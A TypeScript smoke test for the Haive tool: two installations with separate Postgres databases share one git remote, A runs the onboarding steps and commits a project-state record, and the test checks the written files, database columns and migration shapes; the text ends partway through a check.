import { prepareProjectStatePush, commitProjectStatePush } from '../src/project-state/push.js';
import {
  resolveExternalDrift,
  stampExternalWatermark,
} from '../src/step-engine/steps/workflow/_external-drift.js';
import { fixtureBase, httpOrigin, networkGitArgs } from './support/smoke-git-http.js';
/**
 * Two installations, each with its own database, sharing one git remote: A onboards a repository
 * through the real deterministic onboarding steps (01, 02, 04, 06_5, 07, 12, their LLM passes
 * absent) and pushes, and B clones it. Throwaway user, database and temp directory, removed after.
 * Track B's plan is docs/plans/two-install-project-sync.md.
 */
import { execFileSync } from 'node:child_process';
import { existsSync } from 'node:fs';
import { randomBytes, randomUUID } from 'node:crypto';
import { mkdir, mkdtemp, readFile, readdir, rm, stat, writeFile } from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { isDeepStrictEqual } from 'node:util';
import postgres from 'postgres';
import { and, asc, eq, isNull, sql, type SQL } from 'drizzle-orm';
import { createDatabase, schema, type Database } from '@haive/database';
import {
  buildCliRulesBlock,
  buildRepoCliRulesBlock,
  CLI_RULES_DISK_PATH,
  CLI_RULES_END,
  CLI_RULES_START,
  CLI_RULES_TEMPLATE_KIND,
  DEFAULT_AGENT_RULES,
  extractRegion,
  logger,
  normalizeContent,
  resolveEffectiveRules,
  sha256Hex,
  type FormSchema,
} from '@haive/shared';
import { lstatNoFollow } from '@haive/shared/fs-safe';
import {
  blocksUpgrade,
  bundleFileName,
  claimFileName,
  emptyProjectState,
  environmentUnitOf,
  normalizeAgentRulesOverride,
  normalizeProjectState,
  portableSettingsOf,
  toolingUnitOf,
  PROJECT_STATE_IMPORT_STEP_ID,
  renderProjectState,
} from '@haive/shared/project-state';
import type { HaiveDataSaveResult } from '@haive/shared/haive-data';
import { applyPlanPatch, lockPlanMerge } from '@haive/shared/plan';
import { upgradeAdmission } from '@haive/shared/onboarding-admission';
import { markProjectStateDirty } from '@haive/shared/project-state-outbox';
import { initDatabase } from '../src/db.js';
import { handleClone, handleScan, handleInit } from '../src/repo/clone.js';
import { landPlanMerge } from '../src/plan/merge.js';
import { reconcilePlanFromCheckout, writePlanMirror } from '../src/plan/mirror.js';
import { pull, save } from '../src/queues/plan-mirror-queue.js';
import { handleRefresh } from '../src/repo/refresh.js';
import {
  markProjectStatesDirtyAtBoot,
  sweepDirtyProjectStates,
} from '../src/project-state/refresh.js';
import { resolveProjectStateConflict } from '../src/project-state/resolve.js';
import { restoreFaults } from '../src/project-state/set-aside.js';
import { syncProjectStateFromCheckout } from '../src/project-state/sync.js';
import { writeProjectStateColumn, writeProjectStateRecord } from '../src/project-state/write.js';
import { stampRepositoryOnboarded } from '../src/repo/onboarded.js';
import {
  loadLiveArtifacts,
  resolveRenderContext,
  unionExpandedFor,
} from '../src/step-engine/_upgrade-render.js';
import {
  TaskCancelledError,
  type StepContext,
  type StepDefinition,
} from '../src/step-engine/step-definition.js';
import { envDetectStep } from '../src/step-engine/steps/onboarding/01-env-detect.js';
import {
  BASELINE_AGENT_SPECS,
  FRAMEWORK_AGENT_SPECS,
} from '../src/step-engine/steps/onboarding/_agent-templates.js';
import { detectionConfirmationStep } from '../src/step-engine/steps/onboarding/02-detection-confirmation.js';
import { toolingInfrastructureStep } from '../src/step-engine/steps/onboarding/04-tooling-infrastructure.js';
import { agentDiscoveryStep } from '../src/step-engine/steps/onboarding/06_5-agent-discovery.js';
import { generateFilesStep } from '../src/step-engine/steps/onboarding/07-generate-files.js';
import { postOnboardingStep } from '../src/step-engine/steps/onboarding/12-post-onboarding.js';
import {
  RenderContextUnresolvedError,
  upgradePlanStep,
  type UpgradePlanDetect,
} from '../src/step-engine/steps/onboarding-upgrade/01-upgrade-plan.js';
import { upgradeApplyStep } from '../src/step-engine/steps/onboarding-upgrade/02-upgrade-apply.js';
import { planMergeStep } from '../src/step-engine/steps/plan/01-plan-merge.js';

const log = logger.child({ module: 'two-install-smoke' });

if (!process.env.DATABASE_URL) {
  console.error('[smoke] missing env DATABASE_URL');
  process.exit(2);
}
const urlA = process.env.DATABASE_URL;

/** What a second install cannot do yet, each with the Track B PR that closes it. A gap that
 *  passes fails the run, so the PR that closes one removes it here. */
const KNOWN_GAPS: Record<string, string> = {};
const gapsChecked = new Set<string>();

let failures = 0;
let checks = 0;
function check(name: string, ok: boolean, detail?: unknown): void {
  checks += 1;
  const closedBy = KNOWN_GAPS[name];
  if (closedBy !== undefined) {
    gapsChecked.add(name);
    if (!ok) {
      log.warn({ check: name, closedBy, detail }, 'known gap');
      return;
    }
    failures += 1;
    log.error({ check: name, closedBy }, 'FAILED: a known gap passes, remove it from KNOWN_GAPS');
    return;
  }
  if (ok) {
    log.info({ check: name }, 'ok');
    return;
  }
  failures += 1;
  log.error({ check: name, detail }, 'FAILED');
}

const gitEnv = {
  ...process.env,
  GIT_AUTHOR_NAME: 't',
  GIT_AUTHOR_EMAIL: 't@example.com',
  GIT_COMMITTER_NAME: 't',
  GIT_COMMITTER_EMAIL: 't@example.com',
};
const git = (cwd: string, ...args: string[]) =>
  execFileSync('git', ['-c', 'gc.auto=0', ...networkGitArgs(args)], {
    cwd,
    env: gitEnv,
    encoding: 'utf8',
  }).trim();

/** What a person submitting the form untouched sends: every field's own default. */
function defaultValues(form: FormSchema | null): Record<string, unknown> {
  const values: Record<string, unknown> = {};
  for (const field of form?.fields ?? []) {
    if ('defaults' in field) values[field.id] = field.defaults;
    else if ('default' in field) values[field.id] = field.default;
  }
  return values;
}

interface Install {
  name: 'A' | 'B';
  db: Database;
  userId: string;
  providerId: string;
  repositoryId: string;
  repoPath: string;
}

interface ProviderSeed {
  name: 'claude-code' | 'gemini';
  enabled: boolean;
  rulesContent: string;
}

const RULES_A = '# Personal rules\n\n- Rule held only by install A.\n';
const RULES_B = '# Personal rules\n\n- Rule held only by install B.\n';
const RULES_B_OFF = '# Personal rules\n\n- Rule held only by a provider B disabled.\n';
const A_PROVIDERS: ProviderSeed[] = [{ name: 'claude-code', enabled: true, rulesContent: RULES_A }];
const B_PROVIDERS: ProviderSeed[] = [
  { name: 'gemini', enabled: false, rulesContent: RULES_B_OFF },
  { name: 'claude-code', enabled: true, rulesContent: RULES_B },
];

/** One install's user, CLI and repository, cloned from the shared remote as the repo queue would. */
async function cloneInstall(
  name: Install['name'],
  db: Database,
  storage: string,
  remoteUrl: string,
  userId: string = randomUUID(),
  providers: ProviderSeed[] = [{ name: 'claude-code', enabled: true, rulesContent: '' }],
): Promise<Install> {
  const repositoryId = randomUUID();
  const now = new Date();
  await db.insert(schema.users).values({
    id: userId,
    emailEncrypted: `two-install-smoke-${name}`,
    emailBlindIndex: `two-install-smoke-${name}-${randomBytes(6).toString('hex')}`,
    passwordHash: 'smoke-not-real',
    role: 'user',
    status: 'active',
    tokenVersion: 0,
    createdAt: now,
    updatedAt: now,
  });
  let providerId = '';
  for (const seed of providers) {
    const [provider] = await db
      .insert(schema.cliProviders)
      .values({ userId, label: `two-install-smoke ${name}`, ...seed })
      .returning({ id: schema.cliProviders.id });
    if (seed.name === 'claude-code') providerId = provider!.id;
  }
  await db.insert(schema.repositories).values({
    id: repositoryId,
    userId,
    name: 'two-install-smoke',
    source: 'git_https',
    remoteUrl,
    branch: 'main',
    createdAt: now,
    updatedAt: now,
  });
  await handleClone(
    { repositoryId, userId, source: 'git_https', remoteUrl, branch: 'main' },
    db,
    storage,
  );
  return {
    name,
    db,
    userId,
    providerId,
    repositoryId,
    repoPath: path.join(storage, userId, repositoryId),
  };
}

const controller = new AbortController();
function ctxFor(install: Install, taskId: string, taskStepId: string): StepContext {
  return {
    round: 0,
    taskId,
    taskStepId,
    userId: install.userId,
    repoPath: install.repoPath,
    workspacePath: install.repoPath,
    sandboxWorkdir: '/haive/workdir',
    cliProviderId: install.providerId,
    db: install.db,
    logger: log.child({ install: install.name, taskStepId }),
    signal: controller.signal,
    throwIfCancelled: () => {
      if (controller.signal.aborted) throw new TaskCancelledError();
    },
    async emitProgress() {},
  };
}

/** Detect, the form's defaults with `overrides`, apply: each result stored where later steps read it. */
async function runStep<D, O>(
  install: Install,
  step: StepDefinition<D, O>,
  taskId: string,
  taskStepId: string,
  overrides: Record<string, unknown> = {},
  /** What a step's LLM pass answered, for the steps that read one (06_5-agent-discovery). */
  llmOutput?: unknown,
): Promise<{ detected: D; output: O }> {
  const ctx = ctxFor(install, taskId, taskStepId);
  const detected = await step.detect!(ctx);
  await install.db
    .update(schema.taskSteps)
    .set({ detectOutput: detected, status: 'running' })
    .where(eq(schema.taskSteps.id, taskStepId));
  const form = step.form ? await step.form(ctx, detected, llmOutput) : null;
  const formValues = { ...defaultValues(form), ...overrides };
  const output = await step.apply(ctx, {
    detected,
    formValues,
    iteration: 0,
    previousIterations: [],
    llmOutput,
  });
  await install.db
    .update(schema.taskSteps)
    .set({ formValues, output, status: 'done' })
    .where(eq(schema.taskSteps.id, taskStepId));
  return { detected, output };
}

const sorted = (v: unknown) => (Array.isArray(v) ? [...(v as string[])].sort() : v);

const livePaths = async (install: Install): Promise<string[]> =>
  (
    await install.db
      .select({ diskPath: schema.onboardingArtifacts.diskPath })
      .from(schema.onboardingArtifacts)
      .where(
        and(
          eq(schema.onboardingArtifacts.repositoryId, install.repositoryId),
          isNull(schema.onboardingArtifacts.supersededAt),
        ),
      )
  )
    .map((r) => r.diskPath)
    .sort();

const planOf = (install: Install) =>
  install.db
    .select({
      id: schema.planNodes.id,
      parentId: schema.planNodes.parentId,
      title: schema.planNodes.title,
    })
    .from(schema.planNodes)
    .where(eq(schema.planNodes.repositoryId, install.repositoryId))
    .orderBy(asc(schema.planNodes.id));

const RECORD_FORMAT = '.haive-data/state/format.json';
const RECORD_RENDER = '.haive-data/state/project/render.json';

/** The record that holds a render context: its five portable fields, and no other. */
const recordOf = (context: Record<string, unknown>) => ({
  ...emptyProjectState(),
  cli: Array.isArray(context.cliTargets) ? (context.cliTargets as string[]) : [],
  render: {
    projectInfo: context.projectInfo,
    framework: context.framework,
    acceptedAgentIds: context.acceptedAgentIds,
    customAgentSpecs: context.customAgentSpecs,
    lspLanguages: context.lspLanguages,
  } as never,
});

const BUNDLE_DESCRIPTOR = { source: 'zip:smoke-kit', name: 'smoke-kit' };
const A_MCP_SETTINGS = JSON.stringify({
  mcpServers: { 'smoke-only-on-a': { command: 'sh', args: ['-c', 'echo reached'] } },
});

const asJson = (value: unknown): unknown => JSON.parse(JSON.stringify(value)) as unknown;

/** The one custom agent A's agent discovery accepts, as the model's own answer proposes it. */
const LLM_CUSTOM_ID = 'billing-expert';
const LLM_AGENTS = {
  predefined: {},
  custom: [
    {
      id: LLM_CUSTOM_ID,
      label: 'Billing expert',
      hint: 'Knows the billing module',
      recommended: true,
      body: {
        title: 'Billing expert',
        description: 'Knows the billing module',
        color: 'blue',
        field: 'billing',
        tools: ['Read', 'Grep'],
      },
    },
  ],
};

/** An install's upgrade plan: its task and step rows, and 01's detect, or why it could not plan. */
async function upgradePlan(install: Install): Promise<{
  taskId: string;
  stepId: string;
  plan: UpgradePlanDetect | null;
  error: string | null;
}> {
  const [upgrade] = await install.db
    .insert(schema.tasks)
    .values({
      userId: install.userId,
      repositoryId: install.repositoryId,
      type: 'onboarding_upgrade',
      title: 'two-install-smoke',
      status: 'running',
    })
    .returning({ id: schema.tasks.id });
  const [planRow] = await install.db
    .insert(schema.taskSteps)
    .values({
      taskId: upgrade!.id,
      stepId: '01-upgrade-plan',
      stepIndex: 1,
      title: 'Plan upgrade',
      status: 'running',
    })
    .returning({ id: schema.taskSteps.id });
  try {
    const plan = await upgradePlanStep.detect!(ctxFor(install, upgrade!.id, planRow!.id));
    return { taskId: upgrade!.id, stepId: planRow!.id, plan, error: null };
  } catch (err) {
    if (!(err instanceof RenderContextUnresolvedError)) throw err;
    return { taskId: upgrade!.id, stepId: planRow!.id, plan: null, error: err.message };
  }
}

/** An upgrade run through 01 and 02: the plan applied, the apply form's defaults with `pick`'s
 *  values over them, each step's output stored where the next reads it, the task completed. */
async function upgradeApplied(
  install: Install,
  pick: (plan: UpgradePlanDetect, form: FormSchema | null) => Record<string, unknown>,
  planChoices: Record<string, unknown> = {},
): Promise<{ error: string | null }> {
  const planned = await upgradePlan(install);
  if (planned.plan === null) return { error: planned.error };
  const planCtx = ctxFor(install, planned.taskId, planned.stepId);
  const output = await upgradePlanStep.apply(planCtx, {
    detected: planned.plan,
    formValues: { ...defaultValues(upgradePlanStep.form!(planCtx, planned.plan)), ...planChoices },
    iteration: 0,
    previousIterations: [],
  });
  await install.db
    .update(schema.taskSteps)
    .set({ output: output as unknown as Record<string, unknown>, status: 'done' })
    .where(eq(schema.taskSteps.id, planned.stepId));
  const [applyRow] = await install.db
    .insert(schema.taskSteps)
    .values({
      taskId: planned.taskId,
      stepId: '02-upgrade-apply',
      stepIndex: 2,
      title: 'Apply upgrade',
      status: 'running',
    })
    .returning({ id: schema.taskSteps.id });
  const applyCtx = ctxFor(install, planned.taskId, applyRow!.id);
  const detected = await upgradeApplyStep.detect!(applyCtx);
  const form = (await upgradeApplyStep.form!(applyCtx, detected)) as FormSchema | null;
  const applied = await upgradeApplyStep.apply(applyCtx, {
    detected,
    formValues: { ...defaultValues(form), ...pick(planned.plan, form) },
    iteration: 0,
    previousIterations: [],
  });
  await install.db
    .update(schema.taskSteps)
    .set({ output: applied as unknown as Record<string, unknown>, status: 'done' })
    .where(eq(schema.taskSteps.id, applyRow!.id));
  await install.db
    .update(schema.tasks)
    .set({ status: 'completed', completedAt: new Date() })
    .where(eq(schema.tasks.id, planned.taskId));
  return { error: null };
}

const CONTEXT_KEYS = [
  'cliTargets',
  'projectInfo',
  'framework',
  'acceptedAgentIds',
  'customAgentSpecs',
  'agentTargets',
  'lspLanguages',
  'rtkEnabled',
  'enabledCliProviders',
] as const;

const sortedBy = (value: unknown, key: string): unknown =>
  Array.isArray(value)
    ? [...(value as Record<string, string>[])].sort((x, y) =>
        x[key]! < y[key]! ? -1 : x[key]! > y[key]! ? 1 : 0,
      )
    : value;

/** The keys of `got` that differ from `want`, each set compared sorted since every renderer reads it
 *  as one, and `rtkEnabled` against the install's live switch, which is what a clone follows. The
 *  key list is the comparison's first line: a context carrying another key, or missing one, differs. */
function contextDiffers(
  want: Record<string, unknown>,
  got: Record<string, unknown>,
  liveRtk: unknown,
): string[] {
  const keys = Object.keys(got).sort();
  if (!isDeepStrictEqual(keys, [...CONTEXT_KEYS].sort())) return [`keys: ${keys.join(',')}`];
  const normalize: Record<string, (v: unknown) => unknown> = {
    acceptedAgentIds: sorted,
    lspLanguages: sorted,
    agentTargets: (v) => sortedBy(v, 'dir'),
    enabledCliProviders: (v) => sortedBy(v, 'name'),
  };
  return CONTEXT_KEYS.filter((key) => {
    if (key === 'rtkEnabled') return got[key] !== liveRtk;
    const norm = normalize[key] ?? ((v: unknown) => v);
    return !isDeepStrictEqual(asJson(norm(got[key])), asJson(norm(want[key])));
  });
}

/** The rows of a query, or why it failed: a column or table that is missing must fail the one check
 *  that reads it, not end the run. */
async function rowsOf<T>(db: Database, query: SQL): Promise<{ rows: T[] } | { error: string }> {
  try {
    return { rows: (await db.execute(query)) as unknown as T[] };
  } catch (err) {
    const cause = err instanceof Error ? err.cause : undefined;
    const reason = cause instanceof Error ? cause : err;
    return { error: reason instanceof Error ? reason.message : String(reason) };
  }
}

interface ColumnRow {
  column_name: string;
  data_type: string;
  is_nullable: string;
  column_default: string | null;
}
const columnsOf = (db: Database, table: string, only?: string) =>
  rowsOf<ColumnRow>(
    db,
    sql`select column_name, data_type, is_nullable, column_default from information_schema.columns where table_schema = current_schema() and table_name = ${table} and (${only ?? null}::text is null or column_name = ${only ?? null}) order by ordinal_position`,
  );
/** `<type> <YES|NO>` for one column, or null where the query failed or the column is not there. */
function shapeOf(cols: Awaited<ReturnType<typeof columnsOf>>, name: string): string | null {
  const column = 'rows' in cols ? cols.rows.find((c) => c.column_name === name) : undefined;
  return column === undefined ? null : `${column.data_type} ${column.is_nullable}`;
}

async function main(): Promise<void> {
  // Its own plain name per run, so it can only ever drop what it created.
  const nameB = `two_install_smoke_${randomBytes(4).toString('hex')}`;
  const urlB = new URL(urlA);
  urlB.pathname = `/${nameB}`;
  const admin = postgres(urlA, { max: 1, onnotice: () => {} });
  let createdB = false;
  let dbA: Database | null = null;
  let dbB: Database | null = null;
  let poolB: Database | null = null;
  let tmp: string | null = null;
  let userA: string | null = null;
  const landUsers: string[] = [];

  try {
    await admin.unsafe(`CREATE DATABASE "${nameB}"`);
    createdB = true;
    execFileSync(
      'node',
      [fileURLToPath(new URL('migrate/index.js', import.meta.resolve('@haive/database')))],
      { env: { ...process.env, DATABASE_URL: urlB.toString() }, stdio: 'pipe' },
    );
    dbA = createDatabase(urlA);
    dbB = createDatabase(urlB.toString());
    tmp = await mkdtemp(path.join(fixtureBase, 'two-install-smoke-'));

    const origin = path.join(tmp, 'origin.git');
    git(tmp, 'init', '-q', '--bare', '-b', 'main', origin);
    const seed = path.join(tmp, 'seed');
    git(tmp, 'clone', '-q', httpOrigin(origin), seed);
    await writeFile(path.join(seed, 'README.md'), '# two-install smoke\n');
    await writeFile(
      path.join(seed, 'composer.json'),
      `${JSON.stringify({ name: 'acme/two-install', require: { 'drupal/core-recommended': '^10.3' } }, null, 2)}\n`,
    );
    git(seed, 'add', 'README.md', 'composer.json');
    git(seed, 'commit', '-q', '-m', 'seed');
    git(seed, 'push', '-q', 'origin', 'HEAD:main');
    const remoteUrl = httpOrigin(origin);

    // ---- A onboards ----------------------------------------------------------------------
    // Known before the clone runs, so a clone that fails still has its rows removed.
    userA = randomUUID();
    const a = await cloneInstall(
      'A',
      dbA,
      path.join(tmp, 'storage-a'),
      remoteUrl,
      userA,
      A_PROVIDERS,
    );
    const globs = ['vendor/**', 'build/**'];
    await a.db
      .update(schema.repositories)
      .set({ scopeExcludeGlobs: globs })
      .where(eq(schema.repositories.id, a.repositoryId));
    await applyPlanPatch(
      a.db,
      {
        ops: [
          { op: 'upsert', nodeRef: 'root', parentRef: null, title: 'Two-install plan' },
          { op: 'upsert', nodeRef: 'one', parentRef: 'root', title: 'First component' },
          { op: 'upsert', nodeRef: 'two', parentRef: 'root', title: 'Second component' },
        ],
      },
      { repositoryId: a.repositoryId, origin: 'user' },
    );

    const [onboarding] = await a.db
      .insert(schema.tasks)
      .values({
        userId: a.userId,
        repositoryId: a.repositoryId,
        type: 'onboarding',
        title: 'two-install-smoke',
        status: 'running',
      })
      .returning({ id: schema.tasks.id });
    const taskA = onboarding!.id;
    const chain = [
      envDetectStep,
      detectionConfirmationStep,
      toolingInfrastructureStep,
      agentDiscoveryStep,
      generateFilesStep,
      postOnboardingStep,
    ] as const;
    const rows = await a.db
      .insert(schema.taskSteps)
      .values(
        chain.map((step) => ({
          taskId: taskA,
          stepId: step.metadata.id,
          stepIndex: step.metadata.index,
          title: step.metadata.title,
          status: 'pending' as const,
        })),
      )
      .returning({ id: schema.taskSteps.id, stepId: schema.taskSteps.stepId });
    const rowOf = (step: (typeof chain)[number]) =>
      rows.find((r) => r.stepId === step.metadata.id)!.id;

    await runStep(a, envDetectStep, taskA, rowOf(envDetectStep));
    await runStep(a, detectionConfirmationStep, taskA, rowOf(detectionConfirmationStep), {
      projectDescription: 'Two-install smoke fixture.',
    });
    await runStep(a, toolingInfrastructureStep, taskA, rowOf(toolingInfrastructureStep), {
      ragMode: 'none',
      ollamaMode: 'external',
      ollamaUrl: 'http://only-on-a:11434',
      rtkEnabled: false,
    });
    await a.db.execute(
      sql`update repositories set onboarding_tooling = jsonb_set(onboarding_tooling, '{tooling,mcpSettingsJson}', to_jsonb(${A_MCP_SETTINGS}::text)) where id = ${a.repositoryId}`,
    );
    await runStep(a, agentDiscoveryStep, taskA, rowOf(agentDiscoveryStep), {}, LLM_AGENTS);
    const generated = await runStep(a, generateFilesStep, taskA, rowOf(generateFilesStep));
    const rendered = generated.detected;
    check(
      'A renders from the context its earlier steps recorded',
      rendered.framework === 'drupal' &&
        rendered.lspLanguages.includes('php-extended') &&
        rendered.acceptedAgentIds.includes('code-reviewer') &&
        generated.output.wroteFiles.includes('.claude/agents/code-reviewer.md') &&
        generated.output.wroteFiles.some((f) => f.startsWith('.claude/plugins/drupal-php-lsp/')),
      {
        framework: rendered.framework,
        lspLanguages: rendered.lspLanguages,
        acceptedAgentIds: rendered.acceptedAgentIds,
        wroteFiles: generated.output.wroteFiles,
      },
    );
    await a.db.insert(schema.customBundles).values({
      userId: a.userId,
      repositoryId: a.repositoryId,
      name: 'smoke-kit',
      sourceType: 'zip',
      storageRoot: path.join(tmp, 'bundles', 'smoke-kit'),
    });
    const LEGACY_FILES = [
      '.haive-data/environment.json',
      '.haive-data/exclusions.json',
      '.haive-data/tooling.json',
    ];
    await mkdir(path.join(a.repoPath, '.haive-data'), { recursive: true });
    await writeFile(
      path.join(a.repoPath, LEGACY_FILES[0]!),
      '{"schemaVersion":1,"envDetectData":{},"confirmedValues":{}}\n',
    );
    await writeFile(
      path.join(a.repoPath, LEGACY_FILES[1]!),
      '{"schemaVersion":1,"scopeExcludeGlobs":[]}\n',
    );
    await writeFile(
      path.join(a.repoPath, LEGACY_FILES[2]!),
      '{"schemaVersion":1,"tooling":{"ragMode":"none"}}\n',
    );
    git(a.repoPath, 'add', '-f', ...LEGACY_FILES);
    git(a.repoPath, 'commit', '-qm', 'legacy mirrors from an older release');
    const posted = await runStep(a, postOnboardingStep, taskA, rowOf(postOnboardingStep), {
      commit: true,
    });
    check(
      'A commits its onboarding',
      posted.output.commitPerformed && posted.output.commitSha !== null,
      posted.output,
    );
    check(
      "12's commit takes the legacy environment, exclusions and tooling mirrors out of HEAD and the disk",
      LEGACY_FILES.every(
        (rel) =>
          git(a.repoPath, 'ls-tree', '-r', '--name-only', 'HEAD', '--', rel) === '' &&
          !existsSync(path.join(a.repoPath, rel)),
      ),
      git(a.repoPath, 'ls-tree', '-r', '--name-only', 'HEAD', '--', ...LEGACY_FILES),
    );

    // ---- the project record and render context 12 writes (B1.4a) ----------------------------
    // The context 12 renders from is the one it recorded on its artifact rows.
    const [snapshotRow] = await a.db
      .select({ snapshot: schema.onboardingArtifacts.formValuesSnapshot })
      .from(schema.onboardingArtifacts)
      .where(
        and(
          eq(schema.onboardingArtifacts.repositoryId, a.repositoryId),
          isNull(schema.onboardingArtifacts.supersededAt),
        ),
      )
      .limit(1);
    const contextA = (snapshotRow?.snapshot ?? null) as Record<string, unknown> | null;
    check(
      "A's context holds the custom agent its LLM pass proposed",
      contextA !== null &&
        Array.isArray(contextA.customAgentSpecs) &&
        (contextA.customAgentSpecs as { id?: unknown }[]).some((s) => s.id === LLM_CUSTOM_ID) &&
        (contextA.acceptedAgentIds as string[]).includes(LLM_CUSTOM_ID),
      contextA?.customAgentSpecs,
    );
    const [columnsA] = await a.db
      .select({
        onboardingEnvironment: schema.repositories.onboardingEnvironment,
        scopeExcludeGlobs: schema.repositories.scopeExcludeGlobs,
        rtkEnabled: schema.repositories.rtkEnabled,
        rtkVersion: schema.repositories.rtkVersion,
        lspServers: schema.repositories.lspServers,
        lspServerVersions: schema.repositories.lspServerVersions,
        chromeDevtoolsMcpVersion: schema.repositories.chromeDevtoolsMcpVersion,
        reviewDimensions: schema.repositories.reviewDimensions,
        agentRulesOverride: schema.repositories.agentRulesOverride,
        onboardingTooling: schema.repositories.onboardingTooling,
      })
      .from(schema.repositories)
      .where(eq(schema.repositories.id, a.repositoryId))
      .limit(1);
    const toolingUnitA = toolingUnitOf(columnsA?.onboardingTooling);
    const environmentA = environmentUnitOf(columnsA?.onboardingEnvironment);
    const wantRecord =
      contextA === null
        ? null
        : {
            ...recordOf(contextA),
            bundles: [BUNDLE_DESCRIPTOR],
            environment: environmentA,
            settings: {
              ...portableSettingsOf(columnsA!),
              ...(toolingUnitA ? { 'onboarding-tooling': toolingUnitA } : {}),
            },
          };
    const wantFiles = wantRecord === null ? null : renderProjectState(wantRecord);
    const recordOnDisk = (rel: string) =>
      readFile(path.join(a.repoPath, rel), 'utf8').then(
        (text) => text,
        () => null,
      );
    const recordKinds = await Promise.all(
      [RECORD_FORMAT, RECORD_RENDER].map(async (rel) => ({
        rel,
        kind: (await lstatNoFollow(a.repoPath, rel))?.kind ?? null,
      })),
    );
    check(
      "A writes the project record's two files into its checkout",
      recordKinds.every((f) => f.kind === 'file'),
      recordKinds,
    );
    const inCommit = git(
      a.repoPath,
      'diff-tree',
      '--no-commit-id',
      '--name-only',
      '-r',
      posted.output.commitSha!,
    ).split('\n');
    check(
      'and the commit 12 made holds both',
      [RECORD_FORMAT, RECORD_RENDER].every((rel) => inCommit.includes(rel)),
      inCommit,
    );
    const SETTINGS_REL = '.haive-data/state/settings';
    const ENVIRONMENT_REL = '.haive-data/state/project/environment.json';
    check(
      'and the commit 12 made holds the settings and the environment of the columns, and no file for a column that holds nothing',
      environmentA !== null &&
        columnsA?.rtkEnabled === false &&
        columnsA.scopeExcludeGlobs !== null &&
        columnsA.rtkVersion === null &&
        isDeepStrictEqual(inCommit.filter((rel) => rel.startsWith(`${SETTINGS_REL}/`)).sort(), [
          `${SETTINGS_REL}/onboarding-tooling.json`,
          `${SETTINGS_REL}/rtk-enabled.json`,
          `${SETTINGS_REL}/scope-exclude-globs.json`,
        ]) &&
        inCommit.includes(ENVIRONMENT_REL) &&
        (await recordOnDisk(`${SETTINGS_REL}/rtk-enabled.json`)) === 'false\n' &&
        (await recordOnDisk(ENVIRONMENT_REL)) ===
          renderProjectState({ ...emptyProjectState(), environment: environmentA }).get(
            'project/environment.json',
          ),
      { inCommit, columns: columnsA },
    );
    const liveRowsA = await a.db
      .select({
        diskPath: schema.onboardingArtifacts.diskPath,
        templateId: schema.onboardingArtifacts.templateId,
      })
      .from(schema.onboardingArtifacts)
      .where(
        and(
          eq(schema.onboardingArtifacts.repositoryId, a.repositoryId),
          isNull(schema.onboardingArtifacts.supersededAt),
        ),
      );
    const claimFilesWanted = liveRowsA
      .filter((r) => !r.templateId.startsWith('custom.'))
      .map((r) => `.haive-data/state/${claimFileName(r.diskPath)}`);
    check(
      "A's commit holds a claim file for every live row it recorded",
      claimFilesWanted.length > 0 && claimFilesWanted.every((rel) => inCommit.includes(rel)),
      { wanted: claimFilesWanted.length, inCommit },
    );
    const descriptorFile = `.haive-data/state/${bundleFileName(BUNDLE_DESCRIPTOR.source)}`;
    check(
      "A's commit holds the descriptor of its bundle's source",
      inCommit.includes(descriptorFile) &&
        (await recordOnDisk(descriptorFile)) ===
          renderProjectState({ ...emptyProjectState(), bundles: [BUNDLE_DESCRIPTOR] }).get(
            bundleFileName(BUNDLE_DESCRIPTOR.source),
          ),
      inCommit,
    );
    const onDisk = {
      format: await recordOnDisk(RECORD_FORMAT),
      render: await recordOnDisk(RECORD_RENDER),
    };
    check(
      "the record's render unit holds the portable fields of A's context, and only those",
      wantFiles !== null &&
        onDisk.format === wantFiles.get('format.json') &&
        onDisk.render === wantFiles.get('project/render.json'),
      { context: contextA, onDisk },
    );
    const columnA = await rowsOf<{ render_context: unknown }>(
      a.db,
      sql`select render_context from repositories where id = ${a.repositoryId}`,
    );
    check(
      "A's render_context is its context with its RTK choice recorded",
      contextA !== null &&
        'rows' in columnA &&
        columnA.rows.length === 1 &&
        isDeepStrictEqual(asJson(columnA.rows[0]!.render_context), {
          ...contextA,
          rtkChoiceRecorded: true,
        }),
      columnA,
    );
    const syncA = await rowsOf<{ base_snapshot: unknown; last_error: string | null }>(
      a.db,
      sql`select base_snapshot, last_error from project_state_sync where repository_id = ${a.repositoryId}`,
    );
    check(
      "A's sync starts from the record it wrote, claims included, with no error",
      wantRecord !== null &&
        'rows' in syncA &&
        syncA.rows.length === 1 &&
        isDeepStrictEqual(
          asJson({ ...(syncA.rows[0]!.base_snapshot as object), claims: [] }),
          asJson(normalizeProjectState(wantRecord)),
        ) &&
        isDeepStrictEqual(
          (syncA.rows[0]!.base_snapshot as { claims: { path: string }[] }).claims
            .map((c) => c.path)
            .sort(),
          liveRowsA.map((r) => r.diskPath).sort(),
        ) &&
        syncA.rows[0]!.last_error === null,
      syncA,
    );
    const renderColumn = await columnsOf(a.db, 'repositories', 'render_context');
    const syncColumns = await columnsOf(a.db, 'project_state_sync');
    const constraints = await rowsOf<{ conname: string; contype: string; def: string }>(
      a.db,
      sql`select conname, contype, pg_get_constraintdef(oid) as def from pg_constraint where conrelid = to_regclass('project_state_sync')`,
    );
    const keys = 'rows' in constraints ? constraints.rows : [];
    check(
      'migrations 0171, 0213 and 0214 give repositories a nullable render_context and the current project_state_sync shape',
      shapeOf(renderColumn, 'render_context') === 'jsonb YES' &&
        'rows' in syncColumns &&
        syncColumns.rows.length === 6 &&
        isDeepStrictEqual(
          syncColumns.rows.map((c) => c.column_name),
          [
            'repository_id',
            'base_snapshot',
            'last_error',
            'updated_at',
            'synced_hash',
            'synced_head',
          ],
        ) &&
        shapeOf(syncColumns, 'repository_id') === 'uuid NO' &&
        shapeOf(syncColumns, 'base_snapshot') === 'jsonb NO' &&
        shapeOf(syncColumns, 'last_error') === 'text YES' &&
        shapeOf(syncColumns, 'synced_hash') === 'text YES' &&
        shapeOf(syncColumns, 'synced_head') === 'text YES' &&
        syncColumns.rows.find((c) => c.column_name === 'synced_head')?.column_default === null &&
        shapeOf(syncColumns, 'updated_at') === 'timestamp without time zone NO' &&
        /now\(\)/.test(
          String(syncColumns.rows.find((c) => c.column_name === 'updated_at')?.column_default),
        ) &&
        keys.some((k) => k.contype === 'p' && k.def === 'PRIMARY KEY (repository_id)') &&
        keys.some(
          (k) =>
            k.contype === 'f' &&
            k.conname === 'project_state_sync_repository_id_repositories_id_fk' &&
            k.def === 'FOREIGN KEY (repository_id) REFERENCES repositories(id) ON DELETE CASCADE',
        ),
